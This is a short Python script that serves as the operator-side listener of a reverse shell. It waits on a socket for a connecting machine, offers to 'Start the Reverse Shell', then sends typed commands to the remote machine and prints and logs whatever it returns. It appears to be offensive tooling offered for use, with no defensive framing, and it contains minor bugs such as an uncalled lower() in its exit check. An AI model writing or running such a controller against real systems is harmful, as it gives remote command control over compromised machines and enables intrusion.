import socket
import sys
from colorama import Fore
import logging


soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
PORT: int = sys.argv[2] if len(sys.argv) > 2 else 9090

logging.basicConfig(level=logging.DEBUG, filename="server.log")
soc.bind((HOST,PORT))
soc.listen(1)
print(Fore.BLUE + f"[*] Listening on {HOST}:{PORT}...")

while True:
    client = soc.accept()
    # info = client[0].recv(1024).decode()
    print(Fore.GREEN + f"[-] Connected to {client[1]}")
    # print(Fore.CYAN + info)  # Information about client computer
    client[0].send(f"Connected to {HOST}:{PORT}".encode())
    
    sh = input("[-] Start the Reverse Shell (Y/n): ")
    if sh == "n" or sh == "N":
        break
    while True:
        cmd = input(Fore.MAGENTA + ">>> " + Fore.WHITE)
        client[0].send(cmd.encode())
        if cmd.lower in ["q", "exit", "quit"]:
            break
        else:
            output = client[0].recv(1024).decode()
            print(Fore.LIGHTWHITE_EX + output)
            logging.debug(cmd)
            logging.debug(output)
    
    client[0].close()
    break
soc.close()

        
        